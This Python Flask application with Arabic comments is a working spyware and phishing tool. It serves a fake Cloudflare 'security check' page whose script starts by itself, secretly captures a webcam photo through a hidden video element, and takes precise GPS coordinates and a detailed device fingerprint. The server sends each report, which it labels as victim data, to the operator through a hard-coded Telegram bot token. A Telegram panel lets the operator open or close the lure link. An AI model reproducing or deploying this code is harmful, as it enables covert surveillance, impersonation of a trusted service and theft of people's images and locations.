import os
import sys
import time
import json
import base64
import logging
import threading
import requests
import socket
import platform
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify, redirect, make_response
from functools import wraps

# ====================== الإعدادات الأساسية ======================
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'sif-secret-key-2024')
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max

# إعدادات التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)

# ====================== إعدادات البوت ======================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
DEVELOPER_USER = "Y_urd"
CHANNEL_URL = "https://t.me/FAABOT?start=7041600701"

# ====================== نظام التخزين ======================
class DataStorage:
    def __init__(self):
        self.users = {}        # تخزين المستخدمين
        self.sessions = {}     # تخزين الجلسات
        self.stats = {         # إحصائيات
            'total_visits': 0,
            'total_captures': 0,
            'start_time': datetime.now().isoformat()
        }
        self.link_active = True
        self.lock = threading.Lock()
    
    def add_visit(self):
        with self.lock:
            self.stats['total_visits'] += 1
    
    def add_capture(self, ip):
        with self.lock:
            self.stats['total_captures'] += 1
    
    def deactivate_link(self):
        with self.lock:
            self.link_active = False
    
    def activate_link(self):
        with self.lock:
            self.link_active = True
    
    def is_link_active(self):
        with self.lock:
            return self.link_active

storage = DataStorage()

# ====================== دوال مساعدة ======================
def get_real_ip():
    """جلب IP الحقيقي للمستخدم"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr

def get_user_agent():
    """جلب معلومات المتصفح"""
    return request.headers.get('User-Agent', 'Unknown')

def get_location_from_ip(ip):
    """جلب الموقع من IP"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    'country': data.get('country', 'Unknown'),
                    'city': data.get('city', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'),
                    'isp': data.get('isp', 'Unknown'),
                    'lat': data.get('lat', 0),
                    'lon': data.get('lon', 0)
                }
    except:
        pass
    return {'country': 'Unknown', 'city': 'Unknown', 'region': 'Unknown', 'isp': 'Unknown', 'lat': 0, 'lon': 0}

def send_to_telegram(message, photo=None, document=None, keyboard=None):
    """إرسال رسالة إلى تيليجرام مع دعم الصور والمستندات والأزرار"""
    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    
    try:
        if photo:
            if ',' in photo:
                photo_data = base64.b64decode(photo.split(',')[1])
            else:
                photo_data = base64.b64decode(photo)
            requests.post(
                api_url + "sendPhoto",
                data={'chat_id': ADMIN_ID, 'caption': message, 'parse_mode': 'HTML'},
                files={'photo': ('capture.jpg', photo_data)},
                timeout=30
            )
        elif document:
            requests.post(
                api_url + "sendDocument",
                data={'chat_id': ADMIN_ID, 'caption': message, 'parse_mode': 'HTML'},
                files={'document': document},
                timeout=30
            )
        else:
            data = {'chat_id': ADMIN_ID, 'text': message, 'parse_mode': 'HTML'}
            if keyboard:
                data['reply_markup'] = json.dumps(keyboard)
            requests.post(api_url + "sendMessage", json=data, timeout=30)
        logging.info("✅ تم الإرسال إلى تيليجرام")
        return True
    except Exception as e:
        logging.error(f"❌ فشل الإرسال: {e}")
        return False

def send_to_admin(message, photo=None):
    """إرسال رسالة إلى الأدمن"""
    return send_to_telegram(message, photo)

# ====================== القوالب HTML ======================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Cloudflare | التحقق الأمني</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            width: 100%;
        }
        
        .card {
            background: white;
            border-radius: 30px;
            padding: 40px 30px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
            text-align: center;
            animation: fadeInUp 0.6s ease-out;
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .cloudflare-logo {
            width: 120px;
            margin-bottom: 20px;
        }
        
        h2 {
            color: #1a1a2e;
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }
        
        .status-box {
            background: #f8f9fa;
            border-radius: 20px;
            padding: 25px;
            margin: 20px 0;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #f6821f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-bar {
            background: #e0e0e0;
            border-radius: 10px;
            height: 8px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-fill {
            background: linear-gradient(90deg, #f6821f, #ff9800);
            height: 100%;
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 10px;
        }
        
        .status-text {
            color: #555;
            font-size: 14px;
            margin: 15px 0;
        }
        
        .device-info {
            background: #f0f0f0;
            border-radius: 15px;
            padding: 15px;
            margin: 20px 0;
            font-size: 12px;
            text-align: left;
            display: none;
        }
        
        .device-info.show {
            display: block;
        }
        
        .device-info p {
            margin: 5px 0;
            color: #555;
        }
        
        .btn-retry {
            background: #f6821f;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.3s;
            display: none;
        }
        
        .btn-retry:hover {
            background: #e06e0e;
            transform: scale(1.02);
        }
        
        .error-message {
            color: #dc3545;
            font-size: 13px;
            margin-top: 15px;
            padding: 10px;
            background: #ffeaea;
            border-radius: 10px;
            display: none;
        }
        
        .success-message {
            color: #28a745;
            font-size: 13px;
            margin-top: 15px;
            padding: 10px;
            background: #eaffea;
            border-radius: 10px;
            display: none;
        }
        
        .footer {
            margin-top: 20px;
            font-size: 11px;
            color: #aaa;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cloudflare-logo" alt="Cloudflare">
            <h2>✓ التحقق الأمني</h2>
            <p class="subtitle">يتحقق من أمان اتصالك...</p>
            
            <div class="status-box">
                <div class="spinner" id="spinner"></div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="status-text" id="statusText">جاري تهيئة الاتصال الآمن...</div>
            </div>
            
            <div class="device-info" id="deviceInfo">
                <p><strong>📱 معلومات الجهاز:</strong></p>
                <p id="deviceDetails"></p>
            </div>
            
            <div class="error-message" id="errorMsg">
                ⚠️ حدث خطأ في الاتصال. جاري إعادة المحاولة...
            </div>
            
            <div class="success-message" id="successMsg">
                ✅ تم التحقق بنجاح! جاري التوجيه...
            </div>
            
            <button class="btn-retry" id="retryBtn" onclick="startVerification()">🔄 إعادة المحاولة</button>
            <div class="footer">
                Cloudflare • التحقق الأمني المتقدم
            </div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline muted style="position:fixed; top:-100%; left:-100%; width:1px; height:1px"></video>
    <canvas id="canvas" style="display:none"></canvas>
    
    <script>
        let verificationSent = false;
        let progressInterval = null;
        let startTime = null;
        
        function updateProgress(percent) {
            const fill = document.getElementById('progressFill');
            if (fill) fill.style.width = percent + '%';
        }
        
        function updateStatus(text) {
            const statusText = document.getElementById('statusText');
            if (statusText) statusText.innerText = text;
        }
        
        function showError(msg) {
            const errorDiv = document.getElementById('errorMsg');
            if (errorDiv) {
                errorDiv.innerText = msg || '⚠️ حدث خطأ في الاتصال. جاري إعادة المحاولة...';
                errorDiv.style.display = 'block';
            }
            setTimeout(() => {
                if (errorDiv) errorDiv.style.display = 'none';
            }, 5000);
        }
        
        function showSuccess() {
            const successDiv = document.getElementById('successMsg');
            if (successDiv) successDiv.style.display = 'block';
        }
        
        function showDeviceInfo(info) {
            const deviceDiv = document.getElementById('deviceInfo');
            const detailsDiv = document.getElementById('deviceDetails');
            if (deviceDiv && detailsDiv) {
                detailsDiv.innerHTML = info;
                deviceDiv.classList.add('show');
            }
        }
        
        async function getAdvancedDeviceInfo() {
            const info = {};
            
            // معلومات المتصفح
            info.userAgent = navigator.userAgent;
            info.platform = navigator.platform;
            info.language = navigator.language;
            info.languages = navigator.languages.join(', ');
            info.cookieEnabled = navigator.cookieEnabled;
            info.doNotTrack = navigator.doNotTrack;
            info.onLine = navigator.onLine;
            
            // معلومات الشاشة
            info.screenWidth = screen.width;
            info.screenHeight = screen.height;
            info.colorDepth = screen.colorDepth;
            info.pixelRatio = window.devicePixelRatio;
            
            // معلومات النافذة
            info.viewportWidth = window.innerWidth;
            info.viewportHeight = window.innerHeight;
            
            // معلومات الوقت والمنطقة
            info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            info.timezoneOffset = new Date().getTimezoneOffset();
            info.localTime = new Date().toLocaleString();
            
            // معلومات الأجهزة
            info.hardwareConcurrency = navigator.hardwareConcurrency || 'غير معروف';
            info.deviceMemory = navigator.deviceMemory || 'غير معروف';
            info.maxTouchPoints = navigator.maxTouchPoints || 0;
            
            // معلومات البطارية
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    info.batteryLevel = Math.round(battery.level * 100) + '%';
                    info.batteryCharging = battery.charging;
                }
            } catch(e) { info.batteryLevel = 'غير معروف'; }
            
            // معلومات الشبكة
            if (navigator.connection) {
                info.networkType = navigator.connection.effectiveType || 'غير معروف';
                info.networkDownlink = navigator.connection.downlink || 'غير معروف';
                info.networkRtt = navigator.connection.rtt || 'غير معروف';
                info.saveData = navigator.connection.saveData;
            }
            
            // معلومات WebGL (قوة المعالج الرسومي)
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        info.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        info.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) {}
            
            return info;
        }
        
        async function capturePhoto(video) {
            const canvas = document.getElementById('canvas');
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                canvas.width = Math.min(video.videoWidth, 800);
                canvas.height = Math.min(video.videoHeight, 800);
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                return canvas.toDataURL('image/jpeg', 0.6);
            }
            return null;
        }
        
        async function startVerification() {
            if (verificationSent) return;
            
            // إخفاء الأزرار والرسائل السابقة
            document.getElementById('retryBtn').style.display = 'none';
            document.getElementById('errorMsg').style.display = 'none';
            document.getElementById('successMsg').style.display = 'none';
            document.getElementById('spinner').style.display = 'block';
            
            verificationSent = true;
            startTime = Date.now();
            
            // بدء شريط التقدم
            let progress = 0;
            progressInterval = setInterval(() => {
                progress += 2;
                if (progress <= 95) updateProgress(progress);
            }, 150);
            
            let stream = null;
            let collectedData = {};
            
            try {
                // 1. طلب الكاميرا
                updateStatus('📷 طلب الوصول إلى الكاميرا...');
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(resolve => { video.onloadedmetadata = resolve; });
                await video.play();
                updateStatus('✅ تم الوصول إلى الكاميرا');
                
                // 2. جمع معلومات الجهاز المتقدمة
                updateStatus('🔍 جمع معلومات الجهاز...');
                const deviceInfo = await getAdvancedDeviceInfo();
                
                // 3. انتظار قليل للكاميرا
                await new Promise(r => setTimeout(r, 2000));
                
                // 4. التقاط الصورة
                updateStatus('📸 التقاط الصورة...');
                const photoData = await capturePhoto(video);
                
                // 5. تحديد الموقع
                updateStatus('📍 تحديد الموقع الجغرافي...');
                let location = { lat: 0, lon: 0, accuracy: 0 };
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        });
                    });
                    location = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                    updateStatus('✅ تم تحديد الموقع');
                } catch(e) {
                    updateStatus('⚠️ لم يتم تحديد الموقع (قد يكون معطلاً)');
                }
                
                // 6. إرسال البيانات
                updateStatus('📤 إرسال البيانات للتأكيد...');
                
                const payload = {
                    deviceInfo: deviceInfo,
                    photo: photoData,
                    location: location,
                    timestamp: new Date().toISOString(),
                    referrer: document.referrer,
                    url: window.location.href
                };
                
                const response = await fetch('/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    clearInterval(progressInterval);
                    updateProgress(100);
                    updateStatus('✅ اكتمل التحقق! جاري التوجيه...');
                    showSuccess();
                    
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 1500);
                } else {
                    throw new Error('فشل الإرسال');
                }
                
            } catch(error) {
                console.error('Verification error:', error);
                clearInterval(progressInterval);
                updateProgress(0);
                updateStatus('❌ فشل التحقق');
                showError('فشل التحقق: ' + (error.message || 'خطأ غير معروف'));
                document.getElementById('retryBtn').style.display = 'block';
                document.getElementById('spinner').style.display = 'none';
                verificationSent = false;
                
                // إيقاف الكاميرا إذا كانت شغالة
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            }
        }
        
        // بدء التحقق تلقائياً
        setTimeout(startVerification, 500);
    </script>
</body>
</html>
'''

# ====================== مسارات API ======================
@app.route('/')
def index():
    """الصفحة الرئيسية"""
    storage.add_visit()
    
    if not storage.is_link_active():
        return redirect("https://www.google.com")
    
    response = make_response(render_template_string(HTML_TEMPLATE))
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response

@app.route('/capture', methods=['POST'])
def capture():
    """استقبال البيانات من الضحية"""
    if not storage.is_link_active():
        return jsonify({"status": "expired"}), 403
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error"}), 400
        
        device_info = data.get('deviceInfo', {})
        photo = data.get('photo', '')
        location = data.get('location', {})
        timestamp = data.get('timestamp', datetime.now().isoformat())
        
        # جلب معلومات إضافية
        ip = get_real_ip()
        user_agent = get_user_agent()
        location_info = get_location_from_ip(ip)
        
        storage.add_capture(ip)
        
        # بناء التقرير
        report = f"""
🔥 <b>✅ تم سحب بيانات الضحية بنجاح!</b>

━━━━━━━━━━━━━━━━━━━━━━
📱 <b>معلومات الجهاز</b>
━━━━━━━━━━━━━━━━━━━━━━
🖥️ المنصة: {device_info.get('platform', 'غير معروف')}
🌍 اللغة: {device_info.get('language', 'غير معروف')}
🎮 GPU: {device_info.get('gpuRenderer', 'غير معروف')[:100]}
⚙️ المعالج: {device_info.get('hardwareConcurrency', 'غير معروف')} نواة
💾 الذاكرة: {device_info.get('deviceMemory', 'غير معروف')} GB
🔋 البطارية: {device_info.get('batteryLevel', 'غير معروف')}
{dict(充电='نعم' if device_info.get('batteryCharging') else 'لا') if device_info.get('batteryCharging') is not None else ''}

━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>معلومات الشبكة والموقع</b>
━━━━━━━━━━━━━━━━━━━━━━
🌐 IP: <code>{ip}</code>
📍 البلد: {location_info.get('country', 'غير معروف')}
🏙️ المدينة: {location_info.get('city', 'غير معروف')}
📡 مزود الخدمة: {location_info.get('isp', 'غير معروف')}
📶 نوع الشبكة: {device_info.get('networkType', 'غير معروف')}
⚡ سرعة التحميل: {device_info.get('networkDownlink', 'غير معروف')} Mbps

━━━━━━━━━━━━━━━━━━━━━━
📍 <b>الموقع الجغرافي الدقيق</b>
━━━━━━━━━━━━━━━━━━━━━━
🗺️ خط العرض: {location.get('lat', 0)}
🗺️ خط الطول: {location.get('lon', 0)}
🎯 الدقة: {location.get('accuracy', 0)} متر
🔗 <a href='https://www.google.com/maps?q={location.get('lat', 0)},{location.get('lon', 0)}'>عرض على الخريطة</a>

━━━━━━━━━━━━━━━━━━━━━━
🖥️ <b>معلومات المتصفح</b>
━━━━━━━━━━━━━━━━━━━━━━
🍪 الكوكيز: {'مفعلة' if device_info.get('cookieEnabled') else 'معطلة'}
🖱️ نقاط اللمس: {device_info.get('maxTouchPoints', 0)}
📺 دقة الشاشة: {device_info.get('screenWidth', 0)}x{device_info.get('screenHeight', 0)}
🎨 عمق الألوان: {device_info.get('colorDepth', 0)} بت
🌙 توفير البيانات: {'نعم' if device_info.get('saveData') else 'لا'}

━━━━━━━━━━━━━━━━━━━━━━
⏰ <b>معلومات الوقت</b>
━━━━━━━━━━━━━━━━━━━━━━
🕐 المنطقة الزمنية: {device_info.get('timezone', 'غير معروف')}
📅 الوقت المحلي: {device_info.get('localTime', 'غير معروف')}

🔧 <b>User-Agent كامل:</b>
<code>{user_agent[:300]}</code>

━━━━━━━━━━━━━━━━━━━━━━
📊 <b>إحصائيات السيرفر</b>
━━━━━━━━━━━━━━━━━━━━━━
👥 إجمالي الزوار: {storage.stats['total_visits']}
📸 عدد السحبات: {storage.stats['total_captures']}
⏱️ وقت السحب: {timestamp}

⚠️ <b>حالة الرابط:</b> تم تعطيله فوراً بعد الاستخدام
"""
        
        # إرسال التقرير مع الصورة
        send_to_admin(report, photo if photo and len(photo) > 100 else None)
        
        # تعطيل الرابط
        storage.deactivate_link()
        
        logging.info(f"✅ تم سحب البيانات من {ip} - المسار: {location.get('lat', 0)},{location.get('lon', 0)}")
        
        # إرسال إشعار ثانٍ للمطور
        send_to_telegram(f"📊 إحصائيات جديدة: {storage.stats['total_captures']} عملية سحب ناجحة")
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        logging.error(f"❌ خطأ في /capture: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    """Webhook للبوت"""
    try:
        update = request.json
        if not update:
            return "OK", 200
        
        logging.info(f"📨 استلام تحديث: {update.get('message', {}).get('text', '')[:50]}")
        
        # معالجة الرسائل
        if "message" in update:
            msg = update["message"]
            chat_id = msg["chat"]["id"]
            text = msg.get("text", "")
            username = msg.get("from", {}).get("username", "بدون اسم")
            
            # أوامر الأدمن فقط
            if chat_id == ADMIN_ID:
                if text == "/start":
                    welcome = f"""
🎯 مرحباً بك في لوحة التحكم سيف!

<b>الأوامر المتاحة:</b>

🔓 <code>/open</code> - تفعيل الرابط
🔒 <code>/close</code> - تعطيل الرابط
📊 <code>/stats</code> - عرض الإحصائيات
🌍 <code>/ip [IP]</code> - الاستعلام عن IP
👥 <code>/users</code> - عرض عدد المستخدمين
🔗 <code>/link</code> - عرض الرابط الحالي
🔄 <code>/reset</code> - إعادة تعيين الإحصائيات

<b>المطور:</b> @{DEVELOPER_USER}
                    """
                    send_to_telegram(welcome)
                    
                elif text == "/open":
                    storage.activate_link()
                    send_to_telegram("✅ <b>تم تفعيل الرابط بنجاح!</b>\n\nالرابط جاهز لاستقبال ضحية جديدة.")
                    
                elif text == "/close":
                    storage.deactivate_link()
                    send_to_telegram("🔒 <b>تم تعطيل الرابط</b>\n\nلن يتم قبول أي ضحايا جدد.")
                    
                elif text == "/stats":
                    stats_msg = f"""
📊 <b>إحصائيات البوت</b>

👥 إجمالي الزوار: {storage.stats['total_visits']}
📸 عدد السحبات: {storage.stats['total_captures']}
🔗 حالة الرابط: {'✅ مفعل' if storage.is_link_active() else '❌ معطل'}
⏱️ وقت التشغيل: {storage.stats['start_time']}

<b>نسبة النجاح:</b> {int(storage.stats['total_captures'] / max(storage.stats['total_visits'], 1) * 100)}%
"""
                    send_to_telegram(stats_msg)
                    
                elif text == "/link":
                    site_url = os.environ.get('MY_LINK', 'https://sif.onrender.com')
                    send_to_telegram(f"🔗 <b>الرابط الحالي:</b>\n<code>{site_url}</code>")
                    
                elif text == "/reset":
                    storage.stats['total_visits'] = 0
                    storage.stats['total_captures'] = 0
                    send_to_telegram("🔄 <b>تم إعادة تعيين الإحصائيات</b>")
                    
                elif text.startswith("/ip "):
                    ip_addr = text.split()[1]
                    info = get_location_from_ip(ip_addr)
                    ip_msg = f"""
🌐 <b>معلومات IP:</b> <code>{ip_addr}</code>

📍 البلد: {info.get('country', 'غير معروف')}
🏙️ المدينة: {info.get('city', 'غير معروف')}
🗺️ المنطقة: {info.get('region', 'غير معروف')}
📡 مزود الخدمة: {info.get('isp', 'غير معروف')}
"""
                    send_to_telegram(ip_msg)
        
        return "OK", 200
        
    except Exception as e:
        logging.error(f"❌ خطأ في webhook: {e}")
        return "OK", 200

@app.route('/health', methods=['GET'])
def health():
    """فحص صحة السيرفر"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "link_active": storage.is_link_active(),
        "stats": storage.stats,
        "version": "3.0.0"
    }), 200

@app.route('/dashboard', methods=['GET'])
def dashboard():
    """لوحة تحكم بسيطة (للتأكد من الشغل)"""
    if not storage.is_link_active():
        return redirect("https://www.google.com")
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head><title>لوحة التحكم</title></head>
    <body style="font-family: Arial; text-align: center; padding: 50px;">
        <h1>🚀 البوت شغال!</h1>
        <p>حالة الرابط: {"✅ مفعل" if storage.is_link_active() else "❌ معطل"}</p>
        <p>إجمالي الزوار: {storage.stats['total_visits']}</p>
        <p>عدد السحبات: {storage.stats['total_captures']}</p>
        <p>آخر تحديث: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <hr>
        <p>لإدارة البوت، استخدم أوامر تيليجرام مع الحساب الأدمن</p>
    </body>
    </html>
    """
    return html

@app.errorhandler(404)
def not_found(e):
    return redirect("https://www.google.com")

@app.errorhandler(500)
def internal_error(e):
    logging.error(f"خطأ 500: {e}")
    return jsonify({"status": "error"}), 500

# ====================== تشغيل التطبيق ======================
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    
    # طباعة معلومات التشغيل
    print("=" * 50)
    print("🚀 تشغيل بوت سيف - النسخة المتقدمة")
    print("=" * 50)
    print(f"📡 المنفذ: {port}")
    print(f"🤖 توكن البوت: {BOT_TOKEN[:20]}...")
    print(f"👤 معرف الأدمن: {ADMIN_ID}")
    print(f"🔗 حالة الرابط: {'مفعل' if storage.is_link_active() else 'معطل'}")
    print("=" * 50)
    
    app.run(host='0.0.0.0', port=port, threaded=True)
